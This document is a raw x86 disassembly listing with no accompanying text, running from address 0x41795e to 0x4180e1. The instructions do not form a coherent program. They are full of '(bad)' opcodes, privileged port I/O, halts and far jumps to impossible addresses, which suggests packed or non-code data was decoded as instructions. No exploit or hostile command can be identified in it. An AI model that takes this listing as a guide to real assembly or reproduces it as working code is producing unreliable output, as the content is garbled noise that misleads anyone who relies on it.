  41795e:	mov    edx,0xa608947a
  417963:	sbb    al,0xa5
  417965:	in     eax,0xb8
  417967:	cdq    
  417968:	shr    BYTE PTR [ebp+edx*2-0x3e3ef218],cl
  41796f:	in     al,0xa6
  417971:	cld    
  417972:	adc    DWORD PTR [ecx],0xb48145c0
  417978:	sub    DWORD PTR [esi],0xad3b0acf
  41797e:	scas   eax,DWORD PTR es:[edi]
  41797f:	mov    ds:0x5b7a3967,al
  417984:	mov    edi,0x8bb81100
  417989:	push   esi
  41798a:	xchg   ebx,eax
  41798b:	out    0x20,eax
  41798d:	sbb    eax,0x4aa764e1
  417992:	and    al,0xff
  417994:	imul   edi,DWORD PTR [ebx+0x4a],0x75
  417998:	scas   al,BYTE PTR es:[edi]
  417999:	fptan  
  41799b:	fdivr  QWORD PTR [ebx-0x64]
  41799e:	call   DWORD PTR [esi-0x48682972]
  4179a4:	outs   dx,DWORD PTR ds:[esi]
  4179a5:	add    DWORD PTR [esi+0x5],0xffffffcd
  4179a9:	sub    al,0x2f
  4179ab:	xlat   BYTE PTR ds:[ebx]
  4179ac:	shl    DWORD PTR [eax-0x74],cl
  4179af:	adc    esp,0x3f
  4179b2:	jae    0x41794c
  4179b4:	clc    
  4179b5:	pop    ds
  4179b6:	push   ss
  4179b7:	add    dh,BYTE PTR [esi+edi*4+0x132da82d]
  4179be:	jne    0x4179ce
  4179c0:	into   
  4179c1:	repz jmp 0x4179b3
  4179c4:	push   eax
  4179c5:	sbb    al,0xa3
  4179c7:	lea    edi,[ebx-0x9]
  4179ca:	rcr    ebp,cl
  4179cc:	push   0x3e0c839c
  4179d1:	fdivp  st(0),st
  4179d3:	js     0x417a53
  4179d5:	mov    ds:0x3bed72cd,eax
  4179da:	cdq    
  4179db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179dc:	sub    BYTE PTR [eax-0x5bb2cb9a],al
  4179e2:	cli    
  4179e3:	cmp    DWORD PTR [esi+0x68fdbf69],ecx
  4179e9:	adc    al,BYTE PTR [ecx]
  4179eb:	mov    ebp,0xb0380d5f
  4179f0:	push   ebx
  4179f1:	(bad)  
  4179f2:	mov    WORD PTR [esi-0x73b9a3ac],ss
  4179f8:	pop    ebp
  4179f9:	scas   eax,DWORD PTR es:[edi]
  4179fa:	cmovno edx,DWORD PTR [edi-0x5815fc0a]
  417a01:	and    eax,0xfaacdccf
  417a06:	push   ds
  417a07:	fld    st(0)
  417a09:	pushf  
  417a0a:	inc    ecx
  417a0b:	sub    DWORD PTR ds:0xc88053b4,ebx
  417a11:	mov    ch,0xa3
  417a13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a14:	pop    esp
  417a15:	cmp    al,0xb8
  417a17:	xor    eax,0xf97502d2
  417a1c:	mov    ebp,0xf01fc0e7
  417a21:	in     al,dx
  417a22:	sbb    eax,0x90d4372a
  417a27:	scas   eax,DWORD PTR es:[edi]
  417a28:	mov    esp,0xa79367db
  417a2d:	cs xor al,0x39
  417a30:	mov    al,0x5e
  417a32:	cmp    edx,DWORD PTR [eax+0x508d611a]
  417a38:	jmp    0x36ec1616
  417a3d:	mov    bl,0xba
  417a3f:	aaa    
  417a40:	and    ebx,DWORD PTR [eax]
  417a42:	inc    ecx
  417a43:	outs   dx,DWORD PTR ds:[esi]
  417a44:	mov    bl,0x10
  417a46:	adc    al,BYTE PTR [ebp-0x2e]
  417a49:	int3   
  417a4a:	xchg   ebp,eax
  417a4b:	rcr    BYTE PTR [edx],cl
  417a4d:	mov    ebp,eax
  417a4f:	ds js  0x417a42
  417a52:	std    
  417a53:	cli    
  417a54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a55:	dec    ebx
  417a56:	xor    edi,eax
  417a58:	in     al,0xaa
  417a5a:	xchg   esp,eax
  417a5b:	or     eax,DWORD PTR [ecx+0x58]
  417a5e:	ror    DWORD PTR [edx-0x64daade4],0xc6
  417a65:	test   BYTE PTR [edx-0x25],0x31
  417a69:	lds    ecx,FWORD PTR [eax]
  417a6b:	mov    ds:0x5b10f03e,al
  417a70:	cmc    
  417a71:	fstp   DWORD PTR [edi+0x5148ec19]
  417a77:	cmp    eax,0x62e07e76
  417a7c:	pop    ebp
  417a7d:	fdivr  DWORD PTR [edi]
  417a7f:	push   ss
  417a80:	(bad)  
  417a81:	mov    esi,es
  417a83:	cmp    eax,0x521c60bc
  417a88:	pop    edx
  417a89:	sub    BYTE PTR ds:0x63616c,0x22
  417a90:	mov    bh,ah
  417a92:	jg     0x417a53
  417a94:	push   eax
  417a95:	adc    BYTE PTR [ebx-0x24255134],al
  417a9b:	sub    ah,al
  417a9d:	jns    0x417a51
  417a9f:	inc    ecx
  417aa0:	imul   eax,DWORD PTR [ebp+0x37],0xfc352505
  417aa7:	stc    
  417aa8:	adc    al,0x53
  417aaa:	js     0x417a88
  417aac:	dec    esp
  417aad:	aas    
  417aae:	jg     0x417afe
  417ab0:	stos   DWORD PTR es:[edi],eax
  417ab1:	es out 0x8f,eax
  417ab4:	faddp  st(1),st
  417ab6:	xor    DWORD PTR [ebx],edx
  417ab8:	outs   dx,BYTE PTR ds:[esi]
  417ab9:	mov    edx,0x1e7309af
  417abe:	fcomi  st,st(1)
  417ac0:	(bad)  
  417ac1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ac2:	test   eax,0xd1ca16af
  417ac7:	mov    al,0xc2
  417ac9:	xor    BYTE PTR [ecx-0x40],ch
  417acc:	iret   
  417acd:	jo     0x417a9b
  417acf:	call   0x949c6451
  417ad4:	dec    esp
  417ad5:	pop    edx
  417ad6:	sbb    DWORD PTR [edx+0x56],0x14eb2856
  417add:	scas   eax,DWORD PTR es:[edi]
  417ade:	cmp    BYTE PTR [ecx+ebp*8+0x2c752da3],0x1b
  417ae6:	cmc    
  417ae7:	rol    ah,1
  417ae9:	sub    ah,dh
  417aeb:	pop    ss
  417aec:	jecxz  0x417a8c
  417aee:	(bad)  
  417af0:	(bad)  
  417af1:	(bad)  
  417af2:	in     al,0x6
  417af4:	jecxz  0x417b51
  417af6:	int    0x9d
  417af8:	mov    ch,0x18
  417afa:	retf   
  417afb:	in     al,dx
  417afc:	leave  
  417afd:	jmp    0x417ab6
  417aff:	push   0xffffff93
  417b01:	std    
  417b02:	pop    ss
  417b03:	mov    eax,0x25a6bfc0
  417b08:	sahf   
  417b09:	or     bh,BYTE PTR [ebx-0x5d25c4f7]
  417b0f:	dec    esi
  417b10:	mov    bh,0x15
  417b12:	les    ebx,FWORD PTR [ebp+0x29]
  417b15:	inc    edx
  417b16:	fist   DWORD PTR [ebp+0x46]
  417b19:	outs   dx,DWORD PTR ds:[esi]
  417b1a:	(bad)  
  417b1b:	fstp   QWORD PTR [ebx+0x607c0cc7]
  417b21:	sub    ch,BYTE PTR [esi]
  417b23:	fst    DWORD PTR [ecx+0x35200aa5]
  417b29:	icebp  
  417b2a:	mov    gs,ebx
  417b2c:	jle    0x417b65
  417b2e:	repz out dx,al
  417b30:	test   eax,0x7c5c4b3f
  417b35:	in     al,dx
  417b36:	sub    al,0xed
  417b38:	cs out dx,eax
  417b3a:	dec    ebx
  417b3b:	cs hlt 
  417b3d:	into   
  417b3e:	mov    ecx,0x25c3c9dd
  417b43:	and    eax,0xdbfc8dfa
  417b48:	push   ds
  417b49:	mov    DWORD PTR [edi+edi*2+0x42fe44f4],ecx
  417b50:	inc    edi
  417b51:	sbb    al,0xf2
  417b53:	pop    ebx
  417b54:	push   0x2ac652c0
  417b59:	ret    0xc4de
  417b5c:	add    BYTE PTR [esi],cl
  417b5e:	xchg   DWORD PTR [esi],eax
  417b60:	push   edi
  417b61:	jge    0x417b9c
  417b63:	dec    esi
  417b64:	push   edx
  417b65:	mov    gs,WORD PTR [ecx+0x5a]
  417b68:	jecxz  0x417be3
  417b6a:	push   eax
  417b6b:	dec    edi
  417b6c:	int3   
  417b6d:	sub    BYTE PTR [ebx+0x303dc2e7],ch
  417b73:	xlat   BYTE PTR ds:[ebx]
  417b74:	daa    
  417b75:	dec    edx
  417b76:	jns    0x417bac
  417b78:	xchg   ecx,eax
  417b79:	js     0x417b01
  417b7b:	jbe    0x417b5f
  417b7d:	(bad)  
  417b7e:	bswap  edi
  417b80:	mov    ebx,0x5c79b29a
  417b85:	jmp    0xd37da62d
  417b8a:	es xchg esi,eax
  417b8c:	mov    BYTE PTR [esi+eax*4+0xa],al
  417b90:	jl     0x417b59
  417b92:	jle    0x417bd6
  417b94:	stc    
  417b95:	fisubr DWORD PTR [ebp+0x3823002d]
  417b9b:	fdecstp 
  417b9d:	data16 jnp 0x417bbe
  417ba0:	pop    ebx
  417ba1:	push   cs
  417ba2:	and    esp,edi
  417ba4:	(bad)  
  417ba6:	push   ebp
  417ba7:	push   edi
  417ba8:	icebp  
  417ba9:	add    DWORD PTR [edx],eax
  417bab:	mov    ds:0xc99ad032,eax
  417bb0:	adc    dh,al
  417bb2:	into   
  417bb3:	jmp    0x417b49
  417bb5:	call   0x752f:0x79bdccc2
  417bbc:	and    ecx,DWORD PTR [ebp-0x4b]
  417bbf:	cmc    
  417bc0:	js     0x417b55
  417bc2:	pop    esp
  417bc3:	ins    DWORD PTR es:[edi],dx
  417bc4:	in     eax,0xe0
  417bc6:	dec    eax
  417bc7:	pop    esp
  417bc8:	dec    esp
  417bc9:	pop    edx
  417bca:	out    dx,al
  417bcb:	xor    ch,BYTE PTR [ebx]
  417bcd:	jne    0x417c0d
  417bcf:	dec    esp
  417bd0:	or     BYTE PTR [esi],dh
  417bd2:	xchg   edi,eax
  417bd3:	fisubr DWORD PTR [edx]
  417bd5:	push   edx
  417bd6:	xchg   BYTE PTR [ecx+ebp*2],bh
  417bd9:	mov    ss,ebp
  417bdb:	mov    ebx,0x6b55fbd1
  417be0:	mov    ecx,edx
  417be2:	div    al
  417be4:	in     eax,dx
  417be5:	xchg   esi,eax
  417be6:	xchg   edx,eax
  417be7:	gs inc ecx
  417be9:	jns    0x417c21
  417beb:	sub    bl,BYTE PTR [esi]
  417bed:	cli    
  417bee:	stos   BYTE PTR es:[edi],al
  417bef:	and    edx,esp
  417bf1:	stos   BYTE PTR es:[edi],al
  417bf2:	xor    cl,BYTE PTR [esi+0x5d]
  417bf5:	mov    cl,0xad
  417bf7:	xchg   ebx,eax
  417bf8:	pop    ds
  417bf9:	or     bh,BYTE PTR [ebp+0xe911362]
  417bff:	inc    edx
  417c00:	(bad)  
  417c01:	inc    eax
  417c02:	push   edx
  417c03:	leave  
  417c04:	lods   eax,DWORD PTR ds:[esi]
  417c05:	jge    0x417c0d
  417c07:	adc    eax,DWORD PTR ss:[ebx]
  417c0a:	push   0x84a34409
  417c0f:	loop   0x417c68
  417c11:	ins    BYTE PTR es:[edi],dx
  417c12:	enter  0xe077,0x49
  417c16:	pusha  
  417c17:	(bad)  
  417c18:	outs   dx,DWORD PTR ds:[esi]
  417c19:	mov    ?,edx
  417c1b:	and    eax,eax
  417c1d:	adc    DWORD PTR [esi],0xae39c2e9
  417c23:	arpl   WORD PTR [esi],di
  417c25:	test   BYTE PTR [esi-0x5b2b8127],ch
  417c2b:	mov    al,ds:0xa36689c
  417c30:	xor    edi,edi
  417c32:	pop    es
  417c33:	mov    edi,0xcdf2f2cc
  417c38:	jmp    0x417c92
  417c3a:	push   edi
  417c3b:	inc    ebp
  417c3c:	inc    ecx
  417c3d:	jbe    0x417ca8
  417c3f:	imul   ebp,DWORD PTR [ebx+0x194b0842],0xffffffd5
  417c46:	dec    ebx
  417c47:	es push cs
  417c49:	scas   eax,DWORD PTR es:[edi]
  417c4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c4b:	cmc    
  417c4c:	aaa    
  417c4d:	daa    
  417c4e:	push   edi
  417c4f:	add    al,0x5b
  417c51:	rol    DWORD PTR [ebp+0x67],0xc
  417c55:	je     0x417caf
  417c57:	lods   al,BYTE PTR ds:[esi]
  417c58:	dec    ebp
  417c59:	stc    
  417c5a:	outs   dx,BYTE PTR ds:[esi]
  417c5b:	pop    ecx
  417c5c:	into   
  417c5d:	imul   esi,DWORD PTR ds:0x6e62579c,0xc7daaea4
  417c67:	std    
  417c68:	cmp    eax,edi
  417c6a:	call   0x99f0:0x9e252177
  417c71:	mov    esi,0x2ad8eb4f
  417c76:	add    BYTE PTR [esi+0x7d],al
  417c79:	imul   edx,DWORD PTR [eax+0x7aaca8eb],0xe87ad9bf
  417c83:	adc    DWORD PTR [esi],eax
  417c85:	mov    ds:0xc265dbf6,al
  417c8a:	sahf   
  417c8b:	outs   dx,BYTE PTR ds:[esi]
  417c8c:	inc    ebp
  417c8d:	cld    
  417c8e:	call   0x5d80f6ba
  417c93:	push   ebp
  417c94:	hlt    
  417c95:	mov    ebp,0xad0a592b
  417c9a:	xchg   edx,eax
  417c9b:	daa    
  417c9c:	test   ch,bl
  417c9e:	jns    0x417c97
  417ca0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ca1:	inc    eax
  417ca2:	jbe    0x417c8c
  417ca4:	push   esi
  417ca5:	and    DWORD PTR [eax+0x20aa1903],0xffffffe3
  417cac:	cmp    al,0x9e
  417cae:	(bad)  
  417cb0:	rol    BYTE PTR [ebx-0x374d0497],cl
  417cb6:	add    bl,BYTE PTR [edi-0x18]
  417cb9:	std    
  417cba:	scas   al,BYTE PTR es:[edi]
  417cbb:	std    
  417cbc:	or     dl,BYTE PTR [eax+ebp*2-0x1a]
  417cc0:	jb     0x417cc6
  417cc2:	in     eax,dx
  417cc3:	sti    
  417cc4:	mov    ah,0xca
  417cc6:	push   edi
  417cc7:	retf   0x19c0
  417cca:	shl    BYTE PTR [edx+0x13e30406],0xf2
  417cd1:	adc    ecx,esp
  417cd3:	test   DWORD PTR es:[edx+0x26],edx
  417cd7:	repnz stc 
  417cd9:	imul   esi,DWORD PTR [ebp+0x1afed512],0x1923d73d
  417ce3:	sub    eax,0xaf1aab2d
  417ce8:	push   0xffffff96
  417cea:	lea    ecx,[esi+0x41dafb6e]
  417cf0:	sub    BYTE PTR [edx+0x2ed42fee],0xc1
  417cf7:	jae    0x417c8a
  417cf9:	pop    edx
  417cfa:	pop    ds
  417cfb:	adc    edi,esp
  417cfd:	and    eax,DWORD PTR ds:0xe278f7a9
  417d03:	cmp    bl,ch
  417d05:	loopne 0x417d39
  417d07:	jo     0x417c90
  417d09:	inc    esi
  417d0a:	repnz gs daa 
  417d0d:	arpl   WORD PTR [ebx+0x36],cx
  417d10:	push   esp
  417d11:	inc    eax
  417d12:	cmc    
  417d13:	cld    
  417d14:	inc    esi
  417d15:	into   
  417d16:	push   eax
  417d17:	arpl   WORD PTR [edx-0x18],ax
  417d1a:	leave  
  417d1b:	sar    DWORD PTR [edx+0x52],cl
  417d1e:	jecxz  0x417d6d
  417d20:	xor    BYTE PTR [ecx-0x51],bl
  417d23:	push   cs
  417d24:	loope  0x417d78
  417d26:	add    edi,DWORD PTR [esi-0x29dcb8de]
  417d2c:	aam    0xee
  417d2e:	pusha  
  417d2f:	cwde   
  417d30:	cmp    bp,WORD PTR [ebx]
  417d33:	aad    0xf7
  417d35:	shl    BYTE PTR [ebp-0x23],cl
  417d38:	and    BYTE PTR [esi],dl
  417d3a:	hlt    
  417d3b:	add    cl,bh
  417d3d:	cmp    eax,0x211f6f51
  417d42:	mov    bl,0x66
  417d44:	pushf  
  417d45:	adc    al,dl
  417d47:	or     al,ch
  417d49:	push   ebx
  417d4a:	xor    BYTE PTR [ecx+0x5416c52c],ah
  417d50:	pop    ds
  417d51:	into   
  417d52:	mov    DWORD PTR [bx+di-0x7b],ebp
  417d56:	jmp    0x417cf8
  417d58:	ror    esp,0x6e
  417d5b:	or     esp,DWORD PTR [ebp+0x85dbfe0]
  417d61:	arpl   WORD PTR [eax],ax
  417d63:	xchg   esi,eax
  417d64:	cwde   
  417d65:	add    DWORD PTR [edx],ebx
  417d67:	sub    BYTE PTR [ebx],bl
  417d69:	dec    ebx
  417d6a:	sub    ebp,esp
  417d6c:	add    BYTE PTR [ebx],dl
  417d6e:	lock add BYTE PTR [edi+0x7e],ch
  417d72:	and    DWORD PTR [edx-0x2d],0xc4eb3a43
  417d79:	outs   dx,DWORD PTR ds:[esi]
  417d7a:	js     0x417dd4
  417d7c:	jno    0x417d3b
  417d7e:	xlat   BYTE PTR ds:[ebx]
  417d7f:	repnz cmc 
  417d81:	cmp    DWORD PTR [ecx],ecx
  417d83:	in     eax,0x8f
  417d85:	fnsave [ebx]
  417d87:	sbb    ebp,DWORD PTR [ecx]
  417d89:	stos   BYTE PTR es:[edi],al
  417d8a:	mov    ah,0xf4
  417d8c:	dec    esp
  417d8d:	or     eax,0x4c3181aa
  417d92:	out    dx,eax
  417d93:	sub    ah,BYTE PTR [ebp-0x19]
  417d96:	adc    ebp,edx
  417d98:	xchg   ecx,eax
  417d99:	bound  esp,QWORD PTR [eax]
  417d9b:	or     dl,ch
  417d9d:	cs jno 0x417d21
  417da0:	loop   0x417e03
  417da2:	out    dx,eax
  417da3:	jmp    0x51d64981
  417da8:	and    bl,BYTE PTR [eax]
  417daa:	cs pop esi
  417dac:	xchg   esp,eax
  417dad:	(bad)  
  417dae:	in     al,dx
  417daf:	lds    ebp,FWORD PTR [edx+0x5b]
  417db2:	mov    bl,BYTE PTR ss:[edx+edi*4-0x4420caba]
  417dba:	pop    esp
  417dbb:	mov    al,0x60
  417dbd:	scas   al,BYTE PTR es:[edi]
  417dbe:	sub    BYTE PTR [esp+eax*8+0x5052d2aa],bh
  417dc5:	cmp    edi,ebx
  417dc7:	xchg   esp,eax
  417dc8:	mov    ah,0xbd
  417dca:	xchg   ebx,eax
  417dcb:	(bad)  
  417dcc:	stos   DWORD PTR es:[edi],eax
  417dcd:	cld    
  417dce:	pop    esi
  417dcf:	push   ss
  417dd0:	mov    eax,es
  417dd2:	mov    edi,0xda89113c
  417dd7:	lods   eax,DWORD PTR ds:[esi]
  417dd8:	adc    dl,BYTE PTR [esp+edi*2]
  417ddb:	mov    DWORD PTR [edi+0x33],ebx
  417dde:	in     al,0x4c
  417de0:	dec    ebp
  417de1:	rcl    WORD PTR [edx-0x31],cl
  417de5:	cli    
  417de6:	mov    BYTE PTR [esi-0x55ed34ba],dl
  417dec:	call   0x87ab:0x3519c280
  417df3:	push   eax
  417df4:	into   
  417df5:	gs in  eax,dx
  417df7:	push   eax
  417df8:	jmp    0x8ab98c64
  417dfd:	jg     0x417e27
  417dff:	pop    eax
  417e00:	(bad)  
  417e01:	in     al,dx
  417e02:	mov    ebx,0xeb0dec06
  417e07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e08:	or     ch,BYTE PTR [esi-0x4c376a4]
  417e0e:	and    eax,0x1a166764
  417e13:	pop    ebx
  417e14:	pusha  
  417e15:	pop    ebx
  417e16:	sub    eax,DWORD PTR [edx+0x6a]
  417e19:	dec    edx
  417e1a:	(bad)  
  417e1b:	loop   0x417dff
  417e1d:	imul   ecx,DWORD PTR [ecx],0x5c
  417e20:	xor    ecx,DWORD PTR [edi-0x75fab27d]
  417e26:	pop    ss
  417e27:	xchg   BYTE PTR [ebx+ecx*1-0x7],dh
  417e2b:	das    
  417e2c:	push   ds
  417e2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e2e:	push   ebp
  417e2f:	gs inc eax
  417e31:	stc    
  417e32:	jo     0x417e9a
  417e34:	das    
  417e35:	mov    BYTE PTR [ebx-0x3ce3a7b6],bh
  417e3b:	pop    edi
  417e3c:	gs cld 
  417e3e:	mov    ah,0xba
  417e40:	dec    edi
  417e41:	mov    eax,0x36272c0d
  417e46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e47:	stos   BYTE PTR es:[edi],al
  417e48:	and    bl,BYTE PTR [ebp-0x607a110]
  417e4e:	sub    dh,BYTE PTR [ecx-0x51892c70]
  417e54:	inc    ecx
  417e55:	push   edx
  417e56:	or     eax,DWORD PTR [ebx+0x7c]
  417e59:	ret    
  417e5a:	out    dx,eax
  417e5b:	out    0xe5,al
  417e5d:	sub    ebp,DWORD PTR [edx-0x50]
  417e60:	into   
  417e61:	inc    ebp
  417e62:	rcl    BYTE PTR [edi-0x34],cl
  417e65:	imul   ebx,DWORD PTR [ecx],0x3259b708
  417e6b:	xchg   edi,eax
  417e6c:	add    BYTE PTR [eax+ebp*1],0x37
  417e70:	cs add al,0x48
  417e73:	jge    0x417ea1
  417e75:	rol    DWORD PTR [eax-0x5557a673],0xf3
  417e7c:	and    DWORD PTR [ebp+0x274f8670],edx
  417e82:	jle    0x417ee5
  417e84:	fisttp QWORD PTR [ecx+0x6e]
  417e87:	test   DWORD PTR [esi-0x492133ff],ebp
  417e8d:	pop    edx
  417e8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e8f:	rcr    DWORD PTR [esp+ebx*2+0x460d4e0e],1
  417e96:	xchg   DWORD PTR [esi],edi
  417e98:	mov    WORD PTR [eax-0x784da9c5],?
  417e9e:	xchg   ecx,eax
  417e9f:	inc    ebx
  417ea0:	inc    ebp
  417ea1:	sbb    DWORD PTR [esi],ebp
  417ea3:	in     eax,dx
  417ea4:	out    0x52,eax
  417ea6:	lock dec ebp
  417ea8:	icebp  
  417ea9:	sbb    DWORD PTR [eax-0x6],0xffffff9f
  417ead:	cmp    DWORD PTR [ebx-0x2a5e3ee6],ebp
  417eb3:	push   edx
  417eb4:	ret    0x29d5
  417eb7:	jae    0x417ea2
  417eb9:	popa   
  417eba:	inc    esp
  417ebb:	jge    0x417e89
  417ebd:	jmp    0x79f1:0x49f369c4
  417ec4:	xor    DWORD PTR gs:[edx+0x30],0xee1a7811
  417ecc:	and    DWORD PTR [ebx+0x126dd159],0x618fc9c6
  417ed6:	mov    esi,gs
  417ed8:	mov    bl,0x24
  417eda:	call   0x883bb51b
  417edf:	ror    BYTE PTR fs:[edx],cl
  417ee2:	addr16 aaa 
  417ee4:	arpl   WORD PTR ds:0xda4d01cd,si
  417eea:	mov    edi,DWORD PTR [ebx+0x38]
  417eed:	fcomi  st,st(7)
  417eef:	mov    al,ds:0xfc002e36
  417ef4:	iret   
  417ef5:	sbb    eax,0x53687fe3
  417efa:	inc    edi
  417efb:	pop    ds
  417efc:	xor    DWORD PTR [eax+0x44210374],0x23
  417f03:	xor    al,0x51
  417f05:	jmp    0xec937580
  417f0a:	dec    ecx
  417f0b:	and    BYTE PTR [esi+0x4f1256d8],0xb6
  417f12:	jbe    0x417f93
  417f14:	cs mov esi,0xc0e71960
  417f1a:	xchg   ebp,eax
  417f1b:	pop    es
  417f1c:	ins    DWORD PTR es:[edi],dx
  417f1d:	xchg   ebx,eax
  417f1e:	outs   dx,BYTE PTR ds:[esi]
  417f1f:	mov    edi,0xa1bc9b5
  417f24:	sbb    ch,0x24
  417f27:	retf   0xc0d1
  417f2a:	xor    al,0x5b
  417f2c:	rol    BYTE PTR [ebp-0xc],1
  417f2f:	xchg   ecx,eax
  417f30:	lds    esp,FWORD PTR [ebx]
  417f32:	and    ecx,DWORD PTR [eax+0x24]
  417f35:	ja     0x417f51
  417f37:	dec    esi
  417f38:	and    cl,BYTE PTR [eax]
  417f3a:	pusha  
  417f3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f3c:	fnstenv [ebp+0x1e]
  417f3f:	sub    DWORD PTR [ecx+0x54],esp
  417f42:	lahf   
  417f43:	dec    ecx
  417f44:	push   ecx
  417f45:	lock push esi
  417f47:	or     al,al
  417f49:	sahf   
  417f4a:	in     al,dx
  417f4b:	int3   
  417f4c:	repnz retf 0xabee
  417f50:	push   0x73300c79
  417f55:	bnd jb 0x417f59
  417f58:	xor    ebp,DWORD PTR [esi-0x6d7d1c7c]
  417f5e:	daa    
  417f5f:	loope  0x417f54
  417f61:	inc    edx
  417f62:	push   ds
  417f63:	stos   BYTE PTR es:[edi],al
  417f64:	add    ch,BYTE PTR [edi]
  417f66:	pushf  
  417f67:	(bad)  
  417f69:	add    BYTE PTR [ebp+0x45],0xe9
  417f6d:	adc    al,0xbf
  417f6f:	shl    BYTE PTR [edi],0xe4
  417f72:	mov    ebx,0xa1f8dcb4
  417f77:	rol    DWORD PTR [ebx],0x37
  417f7a:	stc    
  417f7b:	push   ebx
  417f7c:	aaa    
  417f7d:	cwde   
  417f7e:	jmp    0x417f46
  417f80:	cld    
  417f81:	push   edi
  417f82:	add    dl,ah
  417f84:	sub    BYTE PTR [ebx+edx*2],0x37
  417f88:	cmp    eax,0xdba55700
  417f8d:	in     al,0xe4
  417f8f:	inc    eax
  417f90:	les    esp,FWORD PTR [edi-0x66]
  417f93:	and    DWORD PTR [eax-0x57],edi
  417f96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f98:	sub    ah,bh
  417f9a:	shr    cl,0xbf
  417f9d:	mov    dl,BYTE PTR [edi-0x36]
  417fa0:	aam    0x9a
  417fa2:	test   BYTE PTR [eax-0x4700edad],0x47
  417fa9:	and    al,0x15
  417fab:	pop    esp
  417fac:	mov    ecx,0xf9ee8b82
  417fb1:	push   eax
  417fb2:	xchg   ch,dl
  417fb4:	(bad)  
  417fb5:	es test ch,bl
  417fb8:	mov    ds:0xb834f228,al
  417fbd:	lahf   
  417fbe:	sub    BYTE PTR [ecx+0x19abfc0a],bh
  417fc4:	sahf   
  417fc5:	pop    ecx
  417fc6:	stc    
  417fc7:	cmp    dh,BYTE PTR [ecx+0x6b54c016]
  417fcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fce:	int    0x4
  417fd0:	mov    edx,0x29510f4d
  417fd5:	or     edi,DWORD PTR [ebx+esi*2+0x60ef3154]
  417fdc:	call   0xb4f2:0xaedba65c
  417fe3:	mov    bh,0x38
  417fe5:	pop    ds
  417fe6:	ins    BYTE PTR es:[edi],dx
  417fe7:	das    
  417fe8:	push   0xba0940dc
  417fed:	add    BYTE PTR [esi],dl
  417fef:	loopne 0x417fec
  417ff1:	mov    edx,0xf51eed34
  417ff6:	jge    0x417fa2
  417ff8:	mov    bh,0xa7
  417ffa:	sbb    eax,0x2a0a866
  417fff:	xchg   edx,eax
  418000:	push   ebp
  418001:	push   ebx
  418002:	push   esp
  418003:	iret   
  418004:	or     dl,BYTE PTR [esp+edi*4+0x22]
  418008:	xor    eax,0xc9c72134
  41800d:	push   eax
  41800f:	outs   dx,BYTE PTR ds:[esi]
  418010:	dec    eax
  418011:	gs ja  0x41805a
  418014:	xchg   BYTE PTR [edx+0x13],ch
  418017:	retf   0x9ac
  41801a:	adc    al,0x12
  41801c:	push   esp
  41801d:	neg    BYTE PTR [esi]
  41801f:	sbb    DWORD PTR [ecx+0x7f],edi
  418022:	ins    DWORD PTR es:[edi],dx
  418023:	inc    esi
  418024:	test   DWORD PTR [eax],esi
  418026:	jne    0x418073
  418028:	inc    edi
  418029:	aas    
  41802a:	js     0x418092
  41802c:	cmp    ch,dl
  41802e:	test   al,0x5f
  418030:	dec    esi
  418031:	dec    ebp
  418032:	mul    BYTE PTR [ebx-0x44c4052f]
  418038:	add    BYTE PTR [esi+0x4ddb473],0x94
  41803f:	sahf   
  418040:	jne    0x418091
  418042:	or     ch,ah
  418044:	pop    ss
  418045:	jp     0x41806d
  418047:	popf   
  418048:	cmp    al,0x34
  41804a:	sbb    al,0x9e
  41804c:	jge    0x4180cd
  41804e:	out    0x94,eax
  418050:	mov    dl,0x64
  418052:	push   edi
  418053:	nop
  418054:	not    DWORD PTR [esi+0x48]
  418057:	int    0x3
  418059:	mov    eax,0x885cadd4
  41805e:	popa   
  41805f:	pusha  
  418060:	mov    al,ds:0xb7512360
  418065:	(bad)  
  418066:	cmc    
  418067:	enter  0x41fa,0xab
  41806b:	(bad)  
  41806c:	push   edx
  41806d:	or     eax,0xab075460
  418072:	push   edx
  418073:	aas    
  418074:	lods   eax,DWORD PTR ds:[esi]
  418075:	sub    cl,BYTE PTR [eax+0x59]
  418078:	add    eax,ebx
  41807a:	mov    bh,0x95
  41807c:	pop    eax
  41807d:	mov    ebx,DWORD PTR [edx+ebx*4-0x56]
  418081:	in     al,dx
  418082:	daa    
  418083:	jbe    0x41806d
  418085:	push   ds
  418086:	or     al,0x58
  418088:	es bswap ebx
  41808b:	outs   dx,DWORD PTR ds:[esi]
  41808c:	push   ss
  41808d:	mov    dh,0x12
  41808f:	add    DWORD PTR [ecx+edi*8-0xa],ecx
  418093:	fistp  DWORD PTR fs:[ecx-0x6e]
  418097:	mov    ch,0x68
  418099:	pushf  
  41809a:	adc    al,0x18
  41809c:	inc    esp
  41809d:	dec    edx
  41809e:	or     edi,DWORD PTR [ebx-0x40]
  4180a1:	fstp   TBYTE PTR [ebp-0x722b6668]
  4180a7:	cwde   
  4180a8:	inc    edx
  4180a9:	jg     0x418105
  4180ab:	enter  0x525d,0x3c
  4180af:	xor    ah,BYTE PTR [eax-0x67]
  4180b2:	inc    esp
  4180b3:	dec    eax
  4180b4:	mov    ds:0x69465656,al
  4180b9:	adc    eax,0x4a3463e2
  4180be:	sub    ebp,DWORD PTR [ebx+ebx*1]
  4180c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180c2:	fnsetpm(287 only) 
  4180c4:	loope  0x418078
  4180c6:	adc    ecx,edi
  4180c8:	mov    ecx,0x6580144c
  4180cd:	int3   
  4180ce:	aad    0x68
  4180d0:	mov    ebx,esp
  4180d2:	xor    DWORD PTR [eax+0x51cfbc83],edi
  4180d8:	jno    0x41805f
  4180da:	jmp    0x4180aa
  4180dc:	and    DWORD PTR [ebp-0x72],edx
  4180df:	push   0xfffffff2
  4180e1:	test   al,0x42
